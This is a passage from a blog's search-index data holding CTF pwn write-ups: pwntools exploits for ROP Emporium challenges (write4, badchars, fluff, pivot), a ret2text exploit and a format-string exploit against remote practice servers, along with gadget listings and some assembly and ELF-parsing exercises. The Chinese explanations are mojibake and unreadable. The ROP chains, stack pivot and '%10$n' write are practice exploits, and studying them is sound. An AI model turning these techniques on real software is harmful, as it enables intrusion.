context.log_level=&#39;debug&#39;
context.os=&#39;linux&#39;
context.arch=&#39;amd64&#39;
context.terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]

elf=ELF(&amp;quot;./write4&amp;quot;)
io=process(&amp;quot;./write4&amp;quot;)

func_addr=elf.symbols[b&amp;quot;print_file&amp;quot;]
bss_addr=0x601038
ret_addr=0x4004e6
pop_rdi_addr=0x400693
mov_r14_r15_addr=0x400628
pop_r14_r15_addr=0x400690
payload=cyclic(0x28)+p64(pop_r14_r15_addr)+p64(bss_addr)+b&amp;quot;flag.txt&amp;quot;+p64(mov_r14_r15_addr)

payload+=p64(pop_rdi_addr)+p64(bss_addr)+p64(func_addr)
io.recv()
gdb.attach(io)
pause()
io.sendline(payload)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;badchars&lt;/strong&gt;&lt;br&gt;
Ê≠§È¢òÁªôÂá∫print_fileÂáΩÊï∞ÂèØ‰ª•ÊâìÂç∞Âá∫Êñá‰ª∂ÂÜÖÂÆπÔºåÂàôÂè™ÈúÄ‰º†ÂÖ•flag.txtÂç≥ÂèØÔºåËÄåÊàë‰ª¨ÂàôÈúÄË¶ÅÂÉè‰∏ä‰∏ÄÈ¢ò‰∏ÄÊ†∑Â∞Üflag.txtÂÜôÂÖ•bssÊÆµ&lt;br&gt;
Ê≠§È¢òÁªôÂá∫libc.soÔºåÂÖ∂‰∏≠ÂåÖÂê´ÁöÑpwnmeÂáΩÊï∞‰∏≠Â≠òÂú®ÂáΩÊï∞ËÉΩÊõøÊç¢Â≠óÁ¨¶&lt;code&gt;&#39;x&#39;,&#39;g&#39;,&#39;a&#39;,&#39;.&#39;&lt;/code&gt;,&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675184254951.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
‰∏∫‰∫ÜÁªïËøábadcharsÔºåÊàë‰ª¨ËÄÉËôë‰ΩøÁî®ÂºÇÊàñÂêé‰∏çÂê´ÂÖ≥ÈîÆÂ≠óÁöÑÂ≠óÁ¨¶‰∏≤ËæìÂÖ•ÔºåÂΩì‰ΩúÂèÇÊï∞ÂÖàÂÜôÂÖ•bssÊÆµÔºåÂÜçÂºÇÊàñ‰∏ÄÈÅçÂæóÂà∞ÂéüÂ≠óÁ¨¶‰∏≤&lt;br&gt;
ÂèØ‰ª•ÂÜô‰∏™Â∞èËÑöÊú¨Âà§Êñ≠&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include&amp;lt;bits/stdc++.h&amp;gt;
using namespace std;
char a[100];
int lg;
signed main()
{
    gets(a);
    lg=strlen(a);
    for(int j=1;j&amp;lt;=9;j++)
    {
        for(int i=0;i&amp;lt;lg;i++)
        {
            cout&amp;lt;&amp;lt;char(int(a[i])^j);
        }
        cout&amp;lt;&amp;lt;endl;
    }
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂæóÂá∫ÂèØÁî®Â≠óÁ¨¶‰∏≤&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675184590104.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Êàë‰ª¨ÈÄâÊã©ÂºÇÊàñ9‰πãÂêéÁöÑÂ≠óÁ¨¶‰∏≤&lt;code&gt;&#39;oehn&#39;}q}&#39;&lt;/code&gt;&lt;br&gt;
ÊïÖexpÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./badchars&amp;quot;)
st=b&amp;quot;oehn&#39;}q}&amp;quot; #flag.txt ^9
bss_addr=0x601038
mov_r13_r12=0x400634
pop_r12_r13_jk_jk=0x40069c
pop_r14_r15=0x4006a0
xor_r15_r14=0x400628
pop_rdi=0x4006a3
func_addr=0x400510
#edit
gdb.attach(io)
pause()
payload=cyclic(0x28)+p64(pop_r12_r13_jk_jk)+st+p64(bss_addr)+p64(0)+p64(0)+p64(mov_r13_r12) #jk junk
#decode
for i in range(0,len(st)):
    payload+=p64(pop_r14_r15)
    payload+=p64(9)
    payload+=p64(bss_addr+i)
    payload+=p64(xor_r15_r14)
payload+=p64(pop_rdi)+p64(bss_addr)+p64(func_addr)
io.recvuntil(b&amp;quot;&amp;gt;&amp;quot;)
io.sendline(payload)
io.interactive()

# Gadgets information
# ============================================================
# 0x00000000004005e2 : mov byte ptr [rip + 0x200a4f], 1 ; pop rbp ; ret
# 0x0000000000400635 : mov dword ptr [rbp], esp ; ret
# 0x0000000000400610 : mov eax, 0 ; pop rbp ; ret
# 0x0000000000400634 : mov qword ptr [r13], r12 ; ret
# 0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040069e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004006a0 : pop r14 ; pop r15 ; ret
# 0x00000000004006a2 : pop r15 ; ret
# 0x000000000040069b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040069f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400588 : pop rbp ; ret
# 0x00000000004006a3 : pop rdi ; ret
# 0x00000000004006a1 : pop rsi ; pop r15 ; ret
# 0x000000000040069d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004004ee : ret
# 0x0000000000400293 : ret 0xb2ec
# 0x0000000000400628 : xor byte ptr [r15], r14b ; ret
# 0x0000000000400629 : xor byte ptr [rdi], dh ; ret

# Unique gadgets found: 18
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂèØ‰ª•ÊâìÈÄö&lt;br&gt;
&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;fluff&lt;/strong&gt;&lt;br&gt;
Ê≠§È¢ò64‰ΩçÔºå‰∏éÊ≠§ÂâçÈ¢òÁ±ª‰ººÔºå‰∏çËøáÊ≠§È¢ògadgetsÂáë‰∏çÂá∫‰ªªÊÑèÂú∞ÂùÄÂÜô&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675354574785.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
‰∫éÊòØÁúãÊú¨È¢òÊèêÁ§∫&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675354609219.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÊâæÂà∞ÂØπÂ∫î‰∏â‰∏™Ê≤°ÊúâËßÅËøáÁöÑÊ±áÁºñÊåá‰ª§ÔºåÁªèÊü•ËØ¢ÂèØ‰ª•ÁêÜËß£Â¶Ç‰∏ãÔºö&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;xlat	mov al,[al+bx]  #al rax‰Ωé8‰Ωç
bextr rbx,rcx,rdx 	Â¶Ç‰∏ãÔºö
bextr output, 0xd23aacda, 0x59
Input : 11010010001110101010110011011010 = 0xd23aacda
                          |-------|
                              \
                               \
                                \
                                 v
                               |-------|
Output: 00000000000000000000000101100110 = 0x00000166


ÊâÄÈúÄÁöÑ‰ΩçÂùóËøõÂÖ•ËæìÂá∫ÁöÑÊúÄ‰ΩéÊúâÊïà‰ΩçÔºåËæìÂá∫ÁöÑÂÖ∂‰Ωô‰ΩçÂèò‰∏∫ 0„ÄÇ
stosb	  mov [rdi],al
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;‰∫éÊòØÊàë‰ª¨ÂèØ‰ª•ËÄÉËôëÊéßÂà∂rbxÔºåÂ∞Ürbx+alÂú∞ÂùÄÊâÄÊåáÁöÑÂÄºÔºåÂç≥&lt;code&gt;[bx+al]&lt;/code&gt;Âèò‰∏∫Êàë‰ª¨ÊâÄÈúÄÁöÑflag.txtÂ≠óÁ¨¶‰∏≤,ËµãÂÄºÁªôrax‰πãÂêéÔºåÂÜçÈÄöËøástosbÂ∞Ürax‰Ωé8‰ΩçalÂÜôÂÖ•Âú∞ÂùÄrdi‰∏≠ÔºåÂç≥ÂèØÂÜôÁöÑbssÊÆµÔºåÊúÄÂêé‰º†ÂèÇÂç≥ÂèØ&lt;br&gt;
‰∏çËøáÊ≠§È¢òÈúÄÊ≥®ÊÑèÊ∫¢Âá∫retÂêéraxÂÄº‰∏∫0xbÔºåÈúÄÂáèÂéªÔºåÊ≠§ÂêéÈô§ÊúÄÂêé‰∏ÄÊ¨°ÁöÑÊØè‰∏ÄÊ¨°ÈÉΩÈúÄÂ∞ÜÂâç‰∏ÄÊ¨°raxÁöÑÂÄºÂáèÂéªÔºå‰ª•Á°Æ‰øùraxËÉΩÂ§üË¢´Ê≠£Á°ÆËµãÂÄºÔºåÂè¶Â§ñÊ≥®ÊÑèrcxÊØèÊ¨°ÊúâÂä†‰∏ä0x3ef2,ÈúÄÂáèÂéªÊ≠§ÂÄº&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675355316129.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÂØªÊâæÊâÄÈúÄÂ≠óÁ¨¶Êàë‰ª¨ÂèØ‰ª•ÂâçÂæÄIDA View-A‰∏≠Â∞ÜÊï∞ÊçÆËΩ¨Êç¢‰∏∫dataÂØªÊâæ(ÊåâdÈîÆËΩ¨Êç¢ÔºåÂ¶ÇÔºö&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675355527454.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÊïÖÁºñÂÜôexpÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from string import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./fluff&amp;quot;)

flag_addr=[0x4003C4,0x4003C5,0x4003D6,0X4003CF,0x4003FD,0x4003D8,0x400246,0x4003D8] #flag.txt
flag=b&amp;quot;flag.txt&amp;quot;
pop_rdi_ret=0x4006a3
xlat_addr=0x400628  #mov al,[al+rbx]   al rax‰Ωé8‰Ωç
pop_rdx_pop_rcx_add_rcx_bextr_addr=0x40062A  #mov rbx,rcx,rdx
stosb_addr=0x400639  #mov [rdi],al
func_addr=0x400510
bss_addr=0x601038
payload=cyclic(0x28)
for i in range(0,8):
    payload+=p64(pop_rdx_pop_rcx_add_rcx_bextr_addr)
    payload+=p64(0x2000)  #0x20 8‰Ωç16ËøõÂà∂Êï∞Âç†4Â≠óËäÇÔºå4bytes=32bits
    if i==0:
        payload+=p64(flag_addr[i]-0x3EF2-0xb)
    else:
        payload+=p64(flag_addr[i]-0x3EF2-int(flag[i-1]))
    payload+=p64(xlat_addr)
    payload+=p64(pop_rdi_ret)
    payload+=p64(bss_addr+i)
    payload+=p64(stosb_addr)

payload+=p64(pop_rdi_ret)+p64(bss_addr)+p64(func_addr)

gdb.attach(io)
pause()

io.sendline(payload)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;pivot&lt;/strong&gt;&lt;br&gt;
Ê≠§È¢ò64‰ΩçÂºÄÂêØnx‰øùÊä§&lt;br&gt;
idaÂèçÁºñËØëËøáÂêéÂèëÁé∞ÂèëÁîüÊ∫¢Âá∫ÁöÑ‰∏∫Á¨¨‰∫åÊ¨°ËæìÂÖ•Ôºå‰ΩÜÊòØÊ∫¢Âá∫ÂêéÂèØÁî®ÈïøÂ∫¶‰ªÖ‰∏∫0x18Ôºà0x40-0x28&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675539374390.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Ê†πÊçÆÊú¨È¢òÊèêÁ§∫ÈúÄË¶ÅËøõË°åÊ†àËøÅÁßª&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675540644083.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ËÄå‰∏ÄÂºÄÂßãÁ®ãÂ∫èÂ∞±ËæìÂá∫‰∫ÜËøÅÁßªÁöÑÂú∞ÂùÄ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675539582981.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ËÄåusefulgadgetsÈáåÈù¢Êèê‰æõÁöÑxhcgÊåá‰ª§&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675539618638.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ËØ•Êåá‰ª§ÂèØ‰ª•‰∫§Êç¢ÂØÑÂ≠òÂô®ÁöÑÂÄºÔºå‰∫éÊòØÊàë‰ª¨ÂèØ‰ª•ÂÖàÂ∞ÜÊèêÁ§∫Ë¶ÅËøÅÁßªÁöÑÂú∞ÂùÄÂÜôÂÖ•raxÔºåÁÑ∂ÂêéÂÜç‰∫§Êç¢raxÂíårspÁöÑÂÄºÔºå‰πãÂêéretÊó∂Áõ∏ÂΩì‰∫épop ripÔºåÊ†πÊçÆÈ¢òÁõÆÁåúÊµãÊ≠§Êó∂ËøõË°åÊ†àËøÅÁßª&lt;br&gt;
Ê†àËøÅÁßªÂêéÊúâÂ¶ÇÊ≠§ÈïøÂ∫¶Êàë‰ª¨‰æøÂèØ‰ª•‰∏çÂèóÈïøÂ∫¶ÈôêÂà∂Âú∞ÁºñÂÜôpayload‰∫Ü&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1675540154636.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Ê≠§È¢òÁªôÂá∫libpivot.soÊñá‰ª∂ÔºåÂπ∂‰∏î‰∏ªÁ®ãÂ∫è‰∏≠ÂèçÁºñËØëÊ≤°Êúâret2winÂáΩÊï∞ÔºåË¶ÅÂÖà‰ªéÁ®ãÂ∫è‰∏≠Ë∞ÉÁî®&lt;code&gt;foothold_function&lt;/code&gt;‰πãÂêéÔºåÊ≥ÑÈú≤ÂáΩÊï∞Âú®ÂÜÖÂ≠ò‰∏≠ÁúüÂÆûÂú∞ÂùÄÔºåÁÑ∂ÂêéÂÜçÈÄöËøá&lt;code&gt;.soÊñá‰ª∂&lt;/code&gt;‰∏≠‰∏§ÂáΩÊï∞‰πãÈó¥ÁöÑÂÅèÁßªÈáèËÆ°ÁÆóÔºåËøõËÄåË∞ÉÁî®&lt;code&gt;ret2win&lt;/code&gt;ÂáΩÊï∞ÔºåÂâ©‰∏ãÁöÑgadgetsÁªÑË£ÖÂ∞±ÊòØÂÖ∏ÂûãÁöÑret2libcÁ±ªÂûãÔºå‰∏çËøáÊèê‰æõÁöÑgadgetsËÆ©payloadÁÆÄÂåñ‰∫ÜËÆ∏Â§ö&lt;br&gt;
expÂ¶Ç‰∏ãÔºö&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

io=process(&amp;quot;./pivot&amp;quot;)
elf=ELF(&amp;quot;./pivot&amp;quot;)

func_plt=elf.plt[b&amp;quot;foothold_function&amp;quot;]
func_got=elf.got[b&amp;quot;foothold_function&amp;quot;]
mov_rax_prax=0x4009c0
pop_rax_ret=0x4009bb
pop_rbp_ret=0x4007c8
add_rax_rbp=0x4009C4
xhcg_rax_rsp=0x4009BD
call_rax=0x4006b0
offset=0x117  #offset

io.recvuntil(b&amp;quot;pivot: &amp;quot;)
heap_addr=int(io.recv(14),16) 

print(&amp;quot;addr &amp;quot;+hex(heap_addr))

payload2=cyclic(0x28)+p64(pop_rax_ret)+p64(heap_addr)+p64(xhcg_rax_rsp)


payload1=p64(func_plt)+p64(pop_rax_ret)+p64(func_got)+p64(mov_rax_prax)+p64(pop_rbp_ret)+p64(offset)+p64(add_rax_rbp)+p64(call_rax)

io.recvuntil(b&amp;quot;&amp;gt; &amp;quot;)
io.sendline(payload1)

io.recvuntil(b&amp;quot;&amp;gt; &amp;quot;)
io.sendline(payload2)

io.interactive()




# 0x00000000004009BB 58                            pop     rax
# 0x00000000004009BC C3                            retn
# 0x00000000004009BC
# 0x00000000004009BD 48 94                         xchg    rax, rsp
# 0x00000000004009BF C3                            retn
# 0x00000000004009BF
# 0x00000000004009C0 48 8B 00                      mov     rax, [rax]
# 0x00000000004009C3 C3                            retn
# 0x00000000004009C3
# 0x00000000004009C4 48 01 E8                      add     rax, rbp
# 0x00000000004009C7 C3                            retn
# 0x00000000004006b0 : call rax
# 0x0000000000400822 : mov byte ptr [rip + 0x20084f], 1 ; pop rbp ; ret
# 0x00000000004009c1 : mov eax, dword ptr [rax] ; ret
# 0x00000000004009c0 : mov rax, qword ptr [rax] ; ret
# 0x0000000000400a2c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400a2e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400a30 : pop r14 ; pop r15 ; ret
# 0x0000000000400a32 : pop r15 ; ret
# 0x00000000004009bb : pop rax ; ret
# 0x0000000000400a2b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400a2f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004007c8 : pop rbp ; ret
# 0x0000000000400a33 : pop rdi ; ret
# 0x0000000000400a31 : pop rsi ; pop r15 ; ret
# 0x0000000000400a2d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004006b6 : ret
&lt;/code&gt;&lt;/pre&gt;
">ROP Emporium writeup</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/aRuqWGDeR/"" data-c="
          &lt;p&gt;Ê≠§È¢ò‰∏∫64‰Ωçret2textÈ¢òÁõÆ&lt;br&gt;
ÂÖàÊü•Áúã‰∏Ä‰∏ã‰øùÊä§&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1674547561780.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Êèê‰æõsystemÂáΩÊï∞Ôºå‰ΩÜÊòØstringÈáåÈù¢Ê≤°ÊúâÊèê‰æõ/bin/sh&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1674547623074.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
tipsÊèêÈÜíÔºåÊ≠§È¢òËÄÉËôë‰º†ÂÖ•&lt;code&gt;$0&lt;/code&gt;‰ªéËÄåÊûÑÂª∫&lt;code&gt;system($0)&lt;/code&gt;&lt;br&gt;
ÊïÖexpÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

# io=process(&amp;quot;./shell&amp;quot;)
io=remote(&amp;quot;1.14.71.254&amp;quot;,28279)
elf=ELF(&amp;quot;./shell&amp;quot;)

ret_addr=0x400416
sys_addr=elf.sym[b&amp;quot;system&amp;quot;]
pop_rdi_addr=0x4005e3
str_0_addr=0x400541
payload=cyclic(0x18)+p64(ret_addr)+p64(pop_rdi_addr)+p64(str_0_addr)+p64(sys_addr)
io.sendline(payload)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[GFCTF 2021]where_is_shell wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/T0lmUGTzu/"" data-c="
          &lt;p&gt;Ê≠§È¢ò32‰ΩçÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤&lt;br&gt;
idaÂèØ‰ª•ÁúãÂá∫ÈôêÂà∂ËæìÂÖ•ÈïøÂ∫¶ÔºåÊ≤°Ê≥ïÊ≠£Â∏∏Ê∫¢Âá∫&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1674214573867.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Áî±‰º™‰ª£Á†ÅÂèØÁü•Âà§Êñ≠Á¨¨‰∫åÊ¨°ËæìÂÖ•Âíå0x804C044Â§ÑÂÄºÁõ∏Á≠âÂç≥ÂèØËæìÂá∫flag.txtÔºå‰ΩÜÊ≠§Â§ÑÂÄº‰∏∫ÈöèÊú∫&lt;br&gt;
‰ΩÜÊòØÂ≠òÂú®&lt;code&gt;printf(buf)&lt;/code&gt;ÊÑèÂë≥ÁùÄÂ≠òÂú®Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÔºå‰∫éÊòØÂèØ‰ª•‰øÆÊîπ0x804C044Â§ÑÁöÑÂÄºÊù•ËææÂà∞ÁõÆÁöÑ&lt;br&gt;
32‰ΩçÂ≠òÊîæÂèÇÊï∞Âú®Ê†à‰∏≠ÔºåÊàë‰ª¨ÂèØ‰ª•Âú®Á¨¨‰∏ÄÊ¨°ËæìÂÖ•Êó∂ËÆ°ÁÆóÂá∫printfÁöÑoffset&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1674214980741.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Áî±ÂõæÂèØÁü•offset‰∏∫10ÔºåAÁöÑASCII‰∏∫41Ôºå41414141Âá∫Áé∞Âú®Á¨¨ÂçÅ‰∏™%xÂ§Ñ&lt;br&gt;
Ê†πÊçÆË¶ÜÁõñÂÜÖÂ≠òÂú∞ÂùÄÊ†ºÂºè&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1674215087906.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÂèØ‰ª•ÁºñÂÜôexpÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
# io=process(&amp;quot;./[Á¨¨‰∫îÁ©∫Èó¥2019 ÂÜ≥Ëµõ]PWN5&amp;quot;)
io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,26596)
bc_addr=0x804C044 #Ë¶ÜÂÜôÂú∞ÂùÄ
payload=p32(bc_addr)+b&amp;quot;%10$n&amp;quot; #offsetÊµãÁÆó‰∏∫10
io.sendline(payload)
io.sendline(b&amp;quot;4&amp;quot;) #0x804C044 8‰Ωç16ËøõÂà∂Êï∞Âç†Áî®4bytes
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[Á¨¨‰∫îÁ©∫Èó¥2019 ÂÜ≥Ëµõ]PWN5 1 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/p8Ia9mzuv/"" data-c="
          &lt;ul&gt;
&lt;li&gt;Ê±áÁºñ&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;func_1:
    mov ax, CCCC
    mov cx, 128
MyLoop: 
    mov [bx], ax
    add bx, 2
    loop MyLoop
    ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;func_1ÁöÑ‰ΩúÁî®ÊòØ&lt;br&gt;
Â∞ÜCCCCÈÄÅËøõaxÂØÑÂ≠òÂô®ÔºåÂ∞Ü128ÈÄÅËøõcxÂØÑÂ≠òÂô®&lt;/p&gt;
&lt;p&gt;MyLoopÁöÑ‰ΩúÁî®ÊòØ&lt;br&gt;
Â∞ÜaxÂØÑÂ≠òÂô®ÁöÑÂÄº&lt;code&gt;CCCC&lt;/code&gt;ÈÄÅËøõÂÅèÁßªÂú∞ÂùÄ‰∏∫bx‰∏≠ÁöÑÂÄºÁöÑÂÜÖÂ≠òÂçïÂÖÉ&lt;br&gt;
ÁÑ∂ÂêéÂ∞ÜbxÁöÑÂÄºÂä†2ÔºàÁªìÊûúÂèØËÉΩÊòØËøõÂÖ•‰∏ã‰∏Ä‰∏™ÂÜÖÂ≠òÂçïÂÖÉÁöÑÂú∞ÂùÄ,‰πüÂ∞±ÊòØ‰∏ã‰∏Ä‰∏™ÂÖÉÁ¥†Âú∞ÂùÄ&lt;br&gt;
ÁÑ∂ÂêéÂú®ÂõûÂà∞MyLoopÂ∞ÜcxÂáè‰∏ÄÔºåÂ¶ÇÊûúcx‰∏ç‰∏∫0ÂàôÁªßÁª≠ÈáçÂ§çÊâßË°å‰ª•‰∏äÊìç‰Ωú&lt;br&gt;
ÊîπÂÜôÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;func_1:
    mov ax, CCCC
    mov cx, 128
MyLoop:
    mov [bx], ax
    add bx, 2
    sub cxÔºå1
    cmp cxÔºå0
    jnz MyLoop
    ret
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Ê†πÊçÆ&lt;code&gt;xor     eax, 33h&lt;/code&gt;ÁåúÊµãÂä†ÂØÜÊñπÂºè‰∏∫ÂºÇÊàñ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
a=[0x5b,0x54,0x52,0x5e,0x56,0x48,0x44,0x56,0x5f,0x50,0x3,0x5e,0x56,0x6c,0x47,0x3,0x6c,0x41,0x56,0x6c,0x44,0x5c,0x41,0x2,0x57,0x12,0x4e]
for i in range(len(a)):
    print(chr(a[i]^0x33),end=&#39;&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1673969471280.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Python&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
def calc(num):
    if num&amp;lt;1:
        return 1
    else:
        return num*calc(num-1)
tp=int(input())
print(calc(tp))
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

def pd(a):
    for i in range(len(a)):
        if int(a[i],2)%5==0:
            print(a[i]+&amp;quot; &amp;quot;,end=&#39;&#39;)
        else:
            continue

a=input().split(&amp;quot;,&amp;quot;)
pd(a)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ELFËß£ÊûêÂô®Ôºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#include&amp;lt;bits/stdc++.h&amp;gt;
#include&amp;lt;elf.h&amp;gt;
using namespace std;
int scnum,sy;
signed main()
{
    printf(&amp;quot;header:\n&amp;quot;);
    Elf64_Ehdr e64_hd;//ÂèÇËßÅelf.hÂÆö‰πâ
    FILE *pt;//ÂÆö‰πâFILEÁ±ªÂûãÁöÑÊåáÈíà
    pt=freopen(&amp;quot;babyof&amp;quot;,&amp;quot;r&amp;quot;,stdin);//ÈúÄË¶ÅÂà§Êñ≠ÁöÑÊñá‰ª∂
    fread(&amp;amp;e64_hd,sizeof(Elf64_Ehdr),1,pt);//‰ªéÊñá‰ª∂ÊµÅËØªÂèñÊï∞ÊçÆÂà∞e64_hd‰∏≠
    printf(&amp;quot;Magic number and other info: &amp;quot;);
    for(int i=0;i&amp;lt;16;i++)
    {
        printf(&amp;quot;%02x &amp;quot;,e64_hd.e_ident[i]);
        // cout&amp;lt;&amp;lt;e64_hd.e_ident[i];
    }
    printf(&amp;quot;\n&amp;quot;);
    printf(&amp;quot;Object file type: %x\n&amp;quot;,e64_hd.e_type);
    // cout&amp;lt;&amp;lt;&amp;quot;Object file type: &amp;quot;&amp;lt;&amp;lt;e64_hd.e_type&amp;lt;&amp;lt;endl;
    printf(&amp;quot;Architecture: %lu\n&amp;quot;,e64_hd.e_machine);
    // cout&amp;lt;&amp;lt;&amp;quot;Architecture: &amp;quot;&amp;lt;&amp;lt;e64_hd.e_machine&amp;lt;&amp;lt;endl;
    printf(&amp;quot;Entry point virtual address: 0x%x\n&amp;quot;,e64_hd.e_entry);
    printf(&amp;quot;Program header table file offset: %d(bytes into file)\n&amp;quot;,e64_hd.e_phoff);
    printf(&amp;quot;Section header table file offset: %d(bytes into file)\n&amp;quot;,e64_hd.e_shoff);
    printf(&amp;quot;Processor-specific flags: 0x%x\n&amp;quot;,e64_hd.e_flags);
    printf(&amp;quot;ELF header size in bytes: %d(bytes)\n&amp;quot;,e64_hd.e_ehsize);
    printf(&amp;quot;Program header table entry size: %d(bytes)\n&amp;quot;,e64_hd.e_phentsize);
    printf(&amp;quot;Program header table entry count: %d\n&amp;quot;,e64_hd.e_phnum);
